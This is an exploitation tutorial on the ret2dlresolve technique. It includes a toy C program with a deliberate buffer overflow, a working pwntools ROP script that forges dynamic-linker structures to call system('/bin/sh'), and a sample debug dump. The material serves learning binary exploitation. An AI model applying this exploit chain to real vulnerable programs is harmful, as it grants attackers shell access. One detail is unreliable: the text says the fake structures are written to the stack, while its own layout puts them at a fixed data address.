# ret2dlresolve: Exploiting Dynamic Linker Resolving to Execute Arbitrary Code

## Overview

The `ret2dlresolve` technique is a Return-Oriented Programming (ROP) exploit that targets the dynamic linker resolution process in binaries. It is commonly used to hijack control flow and invoke functions like `system()` with arbitrary arguments (e.g., spawning a shell). This method is effective when the target application does not have straightforward ROP gadgets for direct function calls but is dynamically linked to libraries like `libc` that resolve function symbols at runtime.

## Exploitation

To demonstrate the exploitation process, we use an example program where a buffer overflow vulnerability exists in the `vuln()` function. The program reads input from the user and does not properly validate the size of the input, allowing an attacker to overflow the buffer and control the program's execution flow.

### Example Program

```c
#include <unistd.h>

void vuln(void){
    char buf[64];
    read(STDIN_FILENO, buf, 200);
}

int main(int argc, char** argv){
    vuln();
}
```

In this example, the vulnerable function `vuln()` uses `read()` to read 200 bytes into a 64-byte buffer. This buffer overflow can be exploited to overwrite the return address and execute arbitrary code.

### Using `pwntools` to Automate the Exploit

`pwntools` provides a convenient helper class, `Ret2dlresolvePayload`, which simplifies the process of interacting with the dynamic linker and resolving function addresses at runtime. Here's how you can automate the exploit using `pwntools`.

```python
from pwn import *

# Load the binary
elf = context.binary = ELF('./vuln')

# Create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

# Create the ROP chain
rop = ROP(elf)

# Overflow buffer (A * 76)
rop.raw('A' * 76)

# Use the read() function to write the fake structures to memory
rop.read(0, dlresolve.data_addr)

# Call the .plt and dl-resolve() with the correct, calculated reloc_offset
rop.ret2dlresolve(dlresolve)

# Log the ROP chain for debugging
log.info(rop.dump())

# Send the crafted payload
p = elf.process()
p.sendline(rop.chain())
p.sendline(dlresolve.payload)

# Interact with the shell
p.interactive()
```

### What Happens in the Exploit?

- **ROP Chain Construction**: The ROP chain is crafted to:
  1. Overflow the buffer (`A` * 76).
  2. Use the `read()` function to write fake structures (such as the `Elf32_Sym` and `Elf32_Rel` structures) to the stack.
  3. Trigger the `.plt` entry to resolve the `system()` function symbol.
  
- **`Ret2dlresolvePayload`**: This payload creates a fake `Elf32_Sym` structure (which holds the symbol for `system()`) and a corresponding `Elf32_Rel` structure (which holds the relocation information). It then places the argument (`/bin/sh`) for the `system()` call at the appropriate location.

- **Dynamic Linker**: The exploit hijacks the dynamic linker by calling `.plt` (Procedure Linkage Table) entries, which in turn resolve the `system()` function at runtime. This is done by passing the fake structures created in memory.

- **Final Execution**: After sending the ROP chain and payload, the attacker controls the execution flow and spawns a shell using the `system()` function with `/bin/sh` as the argument.

### Debugging the Exploit

To gain insight into what is happening during the exploit, `rop.dump()` can be used to log the generated ROP chain. This will show the function calls, addresses, and arguments being passed through the ROP chain.

Hereâ€™s an example output of `rop.dump()`:

```
[DEBUG] PLT 0x8049030 read
[DEBUG] PLT 0x8049040 __libc_start_main
[DEBUG] Symtab: 0x804820c
[DEBUG] Strtab: 0x804825c
[DEBUG] Versym: 0x80482a6
[DEBUG] Jmprel: 0x80482d8
[DEBUG] ElfSym addr: 0x804ce0c
[DEBUG] ElfRel addr: 0x804ce1c
[DEBUG] Symbol name addr: 0x804ce00
[DEBUG] Version index addr: 0x8048c26
[DEBUG] Data addr: 0x804ce00
[DEBUG] PLT_INIT: 0x8049020
[*] 0x0000:          b'AAAA' 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
    [...]
    0x004c:        0x8049030 read(0, 0x804ce00)
    0x0050:        0x804921a <adjust @0x5c> pop edi; pop ebp; ret
    0x0054:              0x0 arg0
    0x0058:        0x804ce00 arg1
    0x005c:        0x8049020 [plt_init] system(0x804ce24)
    0x0060:           0x4b44 [dlresolve index]
    0x0064:          b'zaab' <return address>
    0x0068:        0x804ce24 arg0
```

### Memory Layout Breakdown

1. **0x804ce00**: The address of the symbol name (`system`) in the `.strtab`.
2. **0x804ce0c**: The `Elf32_Sym` structure, containing the symbol index and other data.
3. **0x804ce1c**: The `Elf32_Rel` structure, which includes the relocation information for the `system` function.
4. **0x804ce24**: The string `/bin/sh` which will be passed to `system()` as an argument.

## Final Exploit

After successfully sending the crafted ROP chain and the payload to the process, the exploit resolves the `system()` function and executes `/bin/sh`, giving the attacker control over the system.

```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
rop = ROP(elf)

# Create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

# Construct the ROP chain
rop.raw('A' * 76)
rop.read(0, dlresolve.data_addr)  # Read to write the fake structures
rop.ret2dlresolve(dlresolve)      # Resolve system() using .plt and dl-resolve()

# Log the ROP chain
log.info(rop.dump())

# Send the ROP chain and payload
p.sendline(rop.chain())
p.sendline(dlresolve.payload)  # Pass the structures to read()

# Get interactive shell
p.interactive()
```

## Conclusion

The `ret2dlresolve` exploit is an advanced technique that leverages the dynamic linker to resolve function symbols at runtime, allowing for the execution of arbitrary functions like `system()` with custom arguments. This is particularly useful when traditional ROP gadgets are unavailable but dynamic linking provides an exploitable attack vector.
